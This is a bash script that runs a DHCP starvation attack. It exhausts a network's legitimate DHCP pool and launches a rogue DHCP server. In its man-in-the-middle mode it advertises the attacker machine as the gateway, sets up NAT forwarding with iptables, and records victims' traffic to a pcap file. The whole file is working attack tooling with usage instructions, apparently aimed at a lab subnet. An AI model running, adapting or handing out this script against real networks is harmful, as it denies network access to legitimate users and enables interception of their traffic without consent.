#!/usr/bin/env bash
# Full DHCP starvation attack — stealth or MitM mode.
#
# STEALTH mode (default):
#   Exhausts legitimate DHCP pool + runs rogue dnsmasq with REAL gateway.
#   Victims get rogue lease but connectivity works normally. No interception.
#   Use case: disrupt DHCP, serve rogue DNS, fingerprint victims.
#
# MITM mode:
#   Same as stealth but rogue DHCP advertises THIS VM as the gateway.
#   Victims route all traffic through attacker → real gateway transparently.
#   Observe traffic: sudo bash mitm_intercept.sh (separate terminal)
#   Or set INTERCEPT=1 below to capture inline — no second terminal needed.
#
# Usage:
#   sudo bash dhcp_attack_combined.sh                       # stealth (default)
#   sudo MODE=mitm bash dhcp_attack_combined.sh              # MitM, no capture
#   sudo MODE=mitm INTERCEPT=1 bash dhcp_attack_combined.sh  # MitM + inline pcap
#
# Stop: Ctrl+C

set -uo pipefail

IFACE="${IFACE:-$(ip -o -4 route show to default | awk '{print $5; exit}')}"
MODE="${MODE:-stealth}"
INTERCEPT="${INTERCEPT:-0}"   # 1 = capture victim traffic to pcap (mitm mode only)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXHAUST_SCRIPT="$SCRIPT_DIR/dhcp_exhaustion.py"
ROGUE_SCRIPT="$SCRIPT_DIR/rogue_dhcp_server.sh"

[[ $EUID -ne 0 ]] && { echo "[ERROR] Run as root."; exit 1; }
[[ -f "$EXHAUST_SCRIPT" ]] || { echo "[ERROR] dhcp_exhaustion.py not found in $SCRIPT_DIR"; exit 1; }
[[ -f "$ROGUE_SCRIPT" ]]   || { echo "[ERROR] rogue_dhcp_server.sh not found in $SCRIPT_DIR"; exit 1; }
[[ "$MODE" == "stealth" || "$MODE" == "mitm" ]] || { echo "[ERROR] MODE must be 'stealth' or 'mitm'"; exit 1; }
[[ "$INTERCEPT" == "1" && "$MODE" != "mitm" ]] && { echo "[ERROR] INTERCEPT=1 needs MODE=mitm (nothing to intercept in stealth mode)"; exit 1; }

# ── Step 1: Package check ────────────────────────────────────────────────────
echo "[*] Checking packages..."
PACKAGES=(dnsmasq iptables python3-scapy isc-dhcp-client tcpdump nmap)
MISSING=()
for pkg in "${PACKAGES[@]}"; do
    dpkg -s "$pkg" >/dev/null 2>&1 || MISSING+=("$pkg")
done
if [[ ${#MISSING[@]} -gt 0 ]]; then
    echo "[*] Installing: ${MISSING[*]}"
    apt-get update
    apt-get install -y "${MISSING[@]}"
else
    echo "[+] All packages present."
fi

# ── Step 2: Mode setup ───────────────────────────────────────────────────────
REAL_GW=$(ip route | awk '/default/ {print $3; exit}')
ATTACKER_IP=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2; exit}' | cut -d/ -f1)

if [[ "$MODE" == "mitm" ]]; then
    echo "[*] Mode: MitM — advertising $ATTACKER_IP as victim gateway"
    echo "[*] Real gateway: $REAL_GW (traffic relayed here transparently)"
    ROGUE_GW="$ATTACKER_IP"
    sysctl -w net.ipv4.ip_forward=1 >/dev/null
    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
    iptables -A FORWARD -j ACCEPT
else
    echo "[*] Mode: Stealth — rogue DHCP uses real gateway $REAL_GW"
    ROGUE_GW="$REAL_GW"
fi

# ── Cleanup ──────────────────────────────────────────────────────────────────
cleanup() {
    echo ""
    echo "[*] Stopping attack..."
    kill "${ROGUE_PID:-}" "${EXHAUST_PID:-}" "${PCAP_PID:-}" 2>/dev/null || true
    pkill dnsmasq 2>/dev/null || true
    [[ -n "${PCAP_FILE:-}" ]] && echo "[*] Capture saved → $PCAP_FILE"
    if [[ "$MODE" == "mitm" ]]; then
        sysctl -w net.ipv4.ip_forward=0 >/dev/null
        iptables -t nat -D POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
        iptables -D FORWARD -j ACCEPT 2>/dev/null || true
    fi
    echo "[*] Done."
}
trap cleanup INT TERM EXIT

# ── Step 3: Inline interception (MODE=mitm INTERCEPT=1 only) ────────────────
if [[ "$INTERCEPT" == "1" ]]; then
    PCAP_FILE="$SCRIPT_DIR/mitm_capture_$(date +%Y%m%d_%H%M%S).pcap"
    DEFAULT_FILTER="not arp and not (host $ATTACKER_IP and port 22)"
    echo "[*] Starting inline capture → $PCAP_FILE"
    tcpdump -i "$IFACE" -w "$PCAP_FILE" -U -n $DEFAULT_FILTER &
    PCAP_PID=$!
fi

# ── Step 4: Rogue DHCP ───────────────────────────────────────────────────────
echo "[*] Starting rogue DHCP server..."
IFACE="$IFACE" ROGUE_GW="$ROGUE_GW" bash "$ROGUE_SCRIPT" &
ROGUE_PID=$!
sleep 2   # let dnsmasq bind before exhaustion starts

# ── Step 5: Exhaustion loop ──────────────────────────────────────────────────
echo "[*] Starting DHCP pool exhaustion on $IFACE..."
(
    while true; do
        echo "[exhaust] Pass..."
        python3 "$EXHAUST_SCRIPT" --iface "$IFACE" --timeout 3 --max 60
        echo "[exhaust] Restarting..."
    done
) &
EXHAUST_PID=$!

echo ""
echo "[*] Attack running (mode=$MODE). Pool starved. Rogue DHCP on 10.10.20.210-220."
if [[ "$MODE" == "mitm" ]]; then
    if [[ "$INTERCEPT" == "1" ]]; then
        echo "[*] Capturing inline → $PCAP_FILE"
    else
        echo "[*] Intercept traffic: sudo bash $SCRIPT_DIR/mitm_intercept.sh"
    fi
fi
echo "[*] Ctrl+C to stop."
echo ""

wait
